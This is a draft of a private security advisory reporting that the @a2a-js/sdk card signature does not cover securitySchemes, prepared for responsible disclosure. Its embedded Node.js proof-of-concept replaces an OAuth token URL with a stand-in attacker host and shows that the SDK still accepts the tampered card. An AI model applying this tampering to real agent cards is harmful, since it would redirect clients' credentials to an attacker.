# Security advisory draft: a2a-js, card signature does not cover securitySchemes (J1)

> **NOT SUBMITTED - on hold per product owner (more testing first).**
> Private report only. Never file this as a public issue, and do not mention it publicly until the
> maintainers publish an advisory or a fixed release (a2a-js SECURITY.md, which directs reporters to
> GitHub Security Advisories).
>
> **License: Apache-2.0** (ANet LICENSE, condition 3).

Background and the full analysis: ../issue-a2a-js.md J1. Standalone reproduction:
repro/a2a-js/j1-signature-skips-security-schemes.mjs (embedded below). Re-run it before submitting.

Relation to public discussion (checked 2026-09-29): this is the same root cause as the **public**
issue a2a-js #663 ("canonicalizeAgentCard is input-form dependent - AgentCard instance input silently
drops securitySchemes"), which already has an open fix PR #664 (not merged; last touched 2026-09-09).
Because #663 is already public and describes the field drop, the security-sensitive part to raise
privately is the consequence this draft adds: a card signed by the SDK from its own typed form is
signed **without** securitySchemes, so an intermediary can rewrite an OAuth token endpoint (or any
security scheme) and the SDK's own verifier still accepts the card. If the maintainers consider #663
sufficient and prefer to handle it in the open, this can instead be a comment on #663 pointing at the
signing-side impact - the product owner decides (docs/notes/0032 D-series). If PR #664 has merged and
shipped by filing time, re-run the reproduction and drop this if it no longer reproduces.

## Where and how

a2a-js SECURITY.md (checked 2026-09-29): "To report a security issue, please use GitHub Security
Advisories." Form: https://github.com/a2aproject/a2a-js/security/advisories/new . The submitting
account is the one the product owner designates; the report does not mention anet.

## Form fields

| Field | Value |
|---|---|
| Title | canonicalizeAgentCard drops oneof members (securitySchemes) of a parsed card: signatures do not cover them |
| Ecosystem | npm |
| Package | @a2a-js/sdk |
| Affected versions | >= 1.0.1 (canonicalizeAgentCard's AgentCard.toJSON(AgentCard.fromJSON(card)) round trip; 1.0.0 predates it) up to 1.2.1 |
| Patched versions | none released; fix proposed in PR #664 |
| Severity (suggested; maintainers to assess) | Moderate; needs an attacker able to change the card on its way to the client |
| Weaknesses | CWE-347 Improper Verification of Cryptographic Signature |
| Credits | the submitting account; overlaps the public report #663 |

## Description (paste into the form)

The block below uses four backticks so the inner JS fence survives a copy.

````````markdown
### Summary

`canonicalizeAgentCard(card)` computes `AgentCard.toJSON(AgentCard.fromJSON(card))`. `fromJSON`
expects the JSON form. Given the SDK's own in-memory form - what the TypeScript `AgentCard` type
requires, what `DefaultAgentCardResolver.resolve()` returns, and what a server builds - a oneof member
is `{scheme: {$case, value}}`, which `fromJSON` does not recognise: the entry becomes `{}` and
`cleanEmpty` removes the whole `securitySchemes`. The same happens to every oneof in the card
(`OAuthFlows.flow`).

This is the field drop of the public issue #663. Its security consequence: a card signed by the SDK
from its typed form is signed over a payload without `securitySchemes`, so those schemes can be
changed by anyone on the card's path and the SDK's own verifier still accepts the card.

### PoC

`@a2a-js/sdk` 1.2.1 from registry.npmjs.org, Node.js 20+, no other dependency:

```js
// J1 (security advisory draft): canonicalizeAgentCard(card) computes
// AgentCard.toJSON(AgentCard.fromJSON(card)). fromJSON expects the JSON
// form; given the SDK's own in-memory form (what TypeScript's AgentCard type
// requires, and what DefaultAgentCardResolver.resolve() returns for any v1.0
// card that declares securitySchemes), each oneof member is
// {scheme: {$case, value}}, which fromJSON does not recognise: the entry
// becomes {} and cleanEmpty removes the whole securitySchemes object.
// The same happens to every oneof in the card (OAuthFlows.flow).
//
// Consequences shown below:
//   1. the canonical payload depends on the form of the input (a2a-js #663);
//   2. a card signed over the full §8.4.1 payload (any conformant signer)
//      does not verify through the SDK's client path (resolve -> verify);
//   3. a card signed with the SDK from its typed form is signed without
//      securitySchemes: whoever serves it can replace the OAuth token URL,
//      and a client that resolves and verifies with the SDK accepts it.
//
// Run: node j1-signature-skips-security-schemes.mjs
// Exit status: 0 = behaviour reproduced, 1 = not reproduced, 2 = setup error.
import { createServer } from 'node:http';
import { generateKeyPairSync } from 'node:crypto';
import {
  AgentCard,
  canonicalizeAgentCard,
  generateAgentCardSignature,
  verifyAgentCardSignature,
} from '@a2a-js/sdk';
import { DefaultAgentCardResolver } from '@a2a-js/sdk/client';

console.debug = () => {}; // the verifier logs every failed entry

// A v1.0 card in its JSON form, as served, with an OAuth 2.0
// client-credentials scheme and a requirement that uses it.
const cardJSON = {
  name: 'Payments Agent',
  description: 'd',
  version: '1.0.0',
  supportedInterfaces: [{ url: 'https://payments.example/a2a', protocolBinding: 'JSONRPC', protocolVersion: '1.0' }],
  capabilities: {},
  securitySchemes: {
    oauth: {
      oauth2SecurityScheme: {
        flows: { clientCredentials: { tokenUrl: 'https://payments.example/oauth/token', scopes: { pay: 'pay' } } },
      },
    },
  },
  securityRequirements: [{ schemes: { oauth: { list: ['pay'] } } }],
  defaultInputModes: ['text/plain'],
  defaultOutputModes: ['text/plain'],
  skills: [{ id: 'pay', name: 'pay', description: 'd', tags: ['t'] }],
};

const { privateKey, publicKey } = generateKeyPairSync('ed25519');
const header = { alg: 'EdDSA', typ: 'JOSE', kid: 'k' };
const sign = generateAgentCardSignature(privateKey, header);
const verify = verifyAgentCardSignature(async () => publicKey);
const outcome = async (card) => {
  try {
    await verify(card);
    return 'VERIFIED';
  } catch {
    return 'FAILED';
  }
};

// Serves a JSON body at /.well-known/agent-card.json; returns the base URL.
async function serve(body) {
  const srv = createServer((req, res) => {
    res.setHeader('Content-Type', 'application/json');
    res.end(JSON.stringify(body));
  });
  await new Promise((r) => srv.listen(0, '127.0.0.1', r));
  return { url: `http://127.0.0.1:${srv.address().port}/`, close: () => srv.close() };
}
async function resolveAndVerify(body) {
  const s = await serve(body);
  try {
    const card = await new DefaultAgentCardResolver().resolve(s.url);
    return { result: await outcome(card), card };
  } finally {
    s.close();
  }
}

let reproduced = false;

// 1. Form dependence.
const typed = AgentCard.fromJSON(cardJSON); // the SDK's in-memory (typed) form
const fromJSONForm = canonicalizeAgentCard(cardJSON);
const fromTypedForm = canonicalizeAgentCard(typed);
console.log('1. canonical payload includes securitySchemes');
console.log(`   from the JSON form:   ${fromJSONForm.includes('securitySchemes')}`);
console.log(`   from the typed form:  ${fromTypedForm.includes('securitySchemes')}   (expected: true)`);
if (!fromTypedForm.includes('securitySchemes')) reproduced = true;

// 2. Signed over the full payload (as a2a-python or a2a-go would), served,
//    resolved and verified the way a client does.
const signedFull = await sign(cardJSON);
const r2 = await resolveAndVerify(signedFull);
console.log('2. card signed over the full payload, DefaultAgentCardResolver.resolve() + verifyAgentCardSignature');
console.log(`   ${r2.result}   (expected: VERIFIED)`);
if (r2.result !== 'VERIFIED') reproduced = true;

// 3. Signed from the typed form, served in JSON form, token URL replaced by
//    whoever serves the card.
const signedTyped = await sign(typed);
const served = AgentCard.toJSON(signedTyped);
const tampered = structuredClone(served);
tampered.securitySchemes.oauth.oauth2SecurityScheme.flows.clientCredentials.tokenUrl =
  'https://attacker.example/oauth/token';
const r3 = await resolveAndVerify(tampered);
const tokenUrl = r3.card.securitySchemes.oauth.scheme.value.flows.flow.value.tokenUrl;
console.log('3. card signed from the typed form, token URL replaced in transit, resolve() + verify');
console.log(`   ${r3.result}, client would send its client credentials to ${tokenUrl}   (expected: FAILED)`);
console.log(`   same served card, unmodified, verified in JSON form (what other SDKs do): ${await outcome(served)}   (expected: VERIFIED)`);
if (r3.result === 'VERIFIED') reproduced = true;

console.log(`reproduced: ${reproduced ? 'yes' : 'no'}`);
process.exit(reproduced ? 0 : 1);

```

Output on 1.2.1 (2026-09-29):

```
1. canonical payload includes securitySchemes
   from the JSON form:   true
   from the typed form:  false   (expected: true)
2. card signed over the full payload, DefaultAgentCardResolver.resolve() + verifyAgentCardSignature
   FAILED   (expected: VERIFIED)
3. card signed from the typed form, token URL replaced in transit, resolve() + verify
   VERIFIED, client would send its client credentials to https://attacker.example/oauth/token
   same served card, unmodified, verified in JSON form (what other SDKs do): FAILED
reproduced: yes
```

### Impact

- Integrity: a signature produced by the SDK does not cover `securitySchemes` (nor any oneof), so an
  intermediary can change an OAuth token endpoint, an API-key location, or a whole scheme and the
  SDK's verifier still accepts the card. A client then sends its credentials where the attacker chose.
- Interoperability: a card whose full payload was signed by another SDK (a2a-python, a2a-go) fails
  verification through the SDK's client path; a card signed by a2a-js is rejected by the others.

### Suggested fix

Canonicalize from the JSON form: when given the in-memory form, take `AgentCard.toJSON(card)` rather
than re-running `fromJSON` on it (PR #664's direction), or accept only JSON at the sign/verify entry
points and convert at the call sites. Add a cross-SDK golden with `securitySchemes` and an OAuth2 flow
that must verify after a round trip through each SDK's own type.
````````

## After submission

- Record the advisory id (or the #663 comment link) and date in docs/notes/0032.
- Follow up only privately until the maintainers publish. Proposed window: 90 days or the fixed
  release, whichever is first; noting #663 is already public.
